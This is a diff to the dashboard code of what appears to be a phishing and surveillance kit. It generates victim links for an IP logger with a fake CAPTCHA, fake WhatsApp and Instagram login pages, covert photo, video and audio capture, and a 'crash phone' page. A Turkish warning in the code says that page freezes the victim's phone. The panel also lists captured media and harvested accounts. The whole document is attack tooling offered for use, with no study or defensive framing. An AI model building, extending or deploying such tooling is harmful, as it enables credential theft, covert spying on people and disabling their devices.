@@ -48,7 +48,7 @@
         .duration-value { background: #00ff4122; color: #00ff41; padding: 4px 14px; border-radius: 30px; font-weight: bold; }
         
         .btn-group-custom { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
-        .btn-primary { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; border-radius: 40px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .btn-primary { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; border-radius: 40px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 0.8rem; }
         .btn-primary:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
         .btn-instagram { border-color: #ff3366; color: #ff3366; }
         .btn-instagram:hover { background: #ff3366; color: #fff; }
@@ -56,6 +56,13 @@
         .btn-hack:hover { background: #ffaa00; color: #000; }
         .btn-danger-custom { border-color: #ff3366; color: #ff3366; }
         .btn-danger-custom:hover { background: #ff3366; color: #fff; }
+        .btn-crash { border-color: #ff0000; color: #ff0000; animation: pulse-red 1.5s infinite; }
+        .btn-crash:hover { background: #ff0000; color: #fff; box-shadow: 0 0 20px #ff0000; }
+        
+        @keyframes pulse-red {
+            0%,100% { box-shadow: 0 0 5px #ff0000; }
+            50% { box-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
+        }
         
         .section-divider { display: flex; align-items: center; gap: 12px; margin: 20px 0 15px; }
         .section-divider span { background: #2a2e44; padding: 4px 16px; border-radius: 30px; font-size: 0.7rem; color: #00ff41; }
@@ -159,7 +166,7 @@
         <div class="btn-group-custom">
             <button class="btn-primary btn-hack" id="ipLoggerBtn">📡 IP LOGGER + FAKE CAPTCHA</button>
             <button class="btn-primary btn-hack" id="fakeWABtn">🔐 FAKE WHATSAPP LOGIN</button>
-            <button class="btn-primary btn-hack" id="crashBtn">💀 CRASH PHONE (RAM KILLER)</button>
+            <button class="btn-primary btn-crash" id="crashBtn">💀 CRASH PHONE (RAM KILLER)</button>
             <button class="btn-primary btn-hack" id="instaFakeBtn">📸 INSTAGRAM FAKE LOGIN</button>
         </div>
         <div class="output-box" id="hackOutput"></div>
@@ -228,7 +235,7 @@
             delete: "DELETE", downloadAll: "⬇ DOWNLOAD ALL", noData: "[ NO DATA ]",
             loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
             confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
-            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO const", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO"
+            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO"
         },
         ar: {
             accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
@@ -338,7 +345,6 @@
         } catch(err) { listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
     }
 
-    // HESAPLARI GETİR - INDEX GEREKTİRMEYEN SORGU
     async function loadAccounts() {
         if (!currentUser) return;
         const listDiv = document.getElementById('accountsList');
@@ -352,7 +358,6 @@
                 accounts.push({ id: docSnap.id, ...docSnap.data() });
             });
             
-            // İstemci tarafında sıralama (timestamp'e göre yeniden eskiye)
             accounts.sort((a, b) => {
                 const timeA = a.timestamp || '';
                 const timeB = b.timestamp || '';
@@ -452,20 +457,21 @@
     
     function generateIPLogger() {
         if (!currentUser) return;
-        const hackUrl = `${BASE_URL}/hack/iplogger.html?uid=${currentUser.uid}&redirect=https://google.com`;
+        const hackUrl = `${BASE_URL}/iplogger.html?uid=${currentUser.uid}&redirect=https://google.com`;
         document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📡 IP LOGGER: <a href="${hackUrl}" target="_blank" style="color:#ffaa00">${hackUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${hackUrl}')">${t('copy')}</button>`;
     }
     
     function generateFakeWA() {
         if (!currentUser) return;
-        const waUrl = `${BASE_URL}/hack/fakewhatsapp.html?uid=${currentUser.uid}`;
+        const waUrl = `${BASE_URL}/fakewhatsapp.html?uid=${currentUser.uid}`;
         document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 🔐 FAKE WA: <a href="${waUrl}" target="_blank" style="color:#ffaa00">${waUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${waUrl}')">${t('copy')}</button>`;
     }
     
+    // YENİ CRASH FONKSİYONU - ariha_hacker.html sayfasına yönlendiren link
     function generateCrash() {
         if (!currentUser) return;
-        const crashUrl = `${BASE_URL}/?crash=1&uid=${currentUser.uid}`;
-        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 💀 CRASH: <a href="${crashUrl}" target="_blank" style="color:#ff0000;font-weight:bold;">${crashUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${crashUrl}')">${t('copy')}</button>`;
+        const crashUrl = `${BASE_URL}/ariha_hacker.html`;
+        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 💀 CRASH PHONE: <a href="${crashUrl}" target="_blank" style="color:#ff0000;font-weight:bold;">${crashUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${crashUrl}')">${t('copy')}</button><br><small style="color:#ff0000;">⚠️ Bu link telefonu tamamen kastırır/dondurur! Kurbanın telefonu kapanana kadar kasacaktır.</small>`;
     }
 
     function generateInstaFake() {
@@ -475,9 +481,10 @@
     }
     
     function showStatsInfo() {
-        alert("📊 STATS\n\nBu panelde çekimleriniz listelenir.");
+        alert("📊 STATS\n\nBu panelde çekimleriniz ve hesaplarınız listelenir.");
     }
     
+    // Buton eventleri
     document.getElementById('genPhotoBtn').onclick = () => generateLink('photo', false);
     document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos', false);
     document.getElementById('genVideoOnlyBtn').onclick = () => generateLink('videoonly', false);
